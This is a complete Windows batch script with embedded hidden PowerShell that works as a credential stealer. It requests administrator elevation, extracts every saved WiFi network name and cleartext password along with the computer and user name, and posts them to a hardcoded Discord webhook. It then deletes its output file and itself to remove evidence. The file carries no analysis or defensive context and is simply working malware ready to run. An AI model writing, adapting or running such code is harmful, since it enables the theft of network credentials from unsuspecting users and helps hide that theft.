@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    REM Extract WiFi credentials
    set filepath=%TEMP%\wifi_creds_%USERNAME%_%random%.txt
    
    echo ============================================ > "%filepath%"
    echo WiFi Credentials Extracted! >> "%filepath%"
    echo Computer: %COMPUTERNAME% >> "%filepath%"
    echo User: %USERNAME% >> "%filepath%"
    echo Date: %date% %time% >> "%filepath%"
    echo ============================================ >> "%filepath%"
    echo. >> "%filepath%"
    
    powershell -WindowStyle Hidden -Command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content'); if($pass) {$passValue = ($pass -split ':')[1].Trim()} else {$passValue = 'No password'}; Write-Output \"WiFi: $name`nPassword: $passValue`n---\"} | Out-File '%filepath%' -Append -Encoding utf8"
    
    REM Send to Discord webhook
    powershell -WindowStyle Hidden -Command "$content = Get-Content '%filepath%' -Raw; if($content.Length -gt 1900) {$content = $content.Substring(0,1900) + '...(truncated)'}; $payload = @{ content = '**WiFi Credentials Captured!**```' + $content + '```' } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1429765407006527538/ZvNQHk-1RsSEN0u12m6LZtSOqm3cIgeKBs5I5Y4rE57XI94dmdYLyKBXJKKM9XGR_uWK' -Method Post -Body $payload -ContentType 'application/json'"
    
    REM Clean up evidence
    del "%filepath%" /q
    del "%~f0" /q
    exit /b
) else (
    REM Request admin privileges
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
